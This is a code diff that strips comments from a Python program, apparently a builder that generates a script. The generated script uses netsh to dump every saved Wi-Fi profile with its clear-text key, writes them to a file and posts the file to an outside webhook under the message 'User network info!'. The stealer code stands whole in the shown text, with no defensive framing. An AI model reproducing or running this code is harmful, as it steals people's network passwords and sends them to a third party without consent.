@@ -21,7 +21,6 @@ def check_os():
 
 def get_wifi_profiles():
     try:
-        # Get list of all Wi-Fi profiles saved on the system
         profiles_result = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True, text=True, check=True)
         profiles = re.findall(r"All User Profile\\s*:\\s*(.*)", profiles_result.stdout)
         wifi_credentials = []
@@ -29,10 +28,8 @@ def get_wifi_profiles():
         for profile_name in profiles:
             profile_name = profile_name.strip()
             try:
-                # Get details of the specific profile
                 profile_details_result = subprocess.run(["netsh", "wlan", "show", "profile", profile_name, "key=clear"], capture_output=True, text=True, check=True)
                 
-                # Search for the password in the profile details
                 password_search = re.search(r"Key Content\\s*:\\s*(.*)", profile_details_result.stdout)
                 password = password_search.group(1).strip() if password_search else "No password found"
                 
@@ -41,18 +38,15 @@ def get_wifi_profiles():
             except subprocess.CalledProcessError as e:
                 print(f"Failed to retrieve profile for {{profile_name}}: {{e}}")
 
-        # Write the Wi-Fi information to a file
         with open("output.txt", "w") as f:
             for info in wifi_credentials:
                 f.write(info + "\\n")
 
-        # Send the file to the webhook
         with open("output.txt", 'rb') as file:
             payload = {{'content': 'User network info!'}}
             files = {{'file': file}}
             response = requests.post(webhook_url, data=payload, files=files)
 
-        # Check if the request was successful
         if response.status_code == 204:
             print("Successfully sent Wi-Fi info to the webhook.")
         else:
@@ -67,7 +61,6 @@ def start():
         payload = {{'content': 'OS not supported'}}
         requests.post(webhook_url, data=payload)
 
-# Start the script
 start()
 """)
         link.delete(0, END)
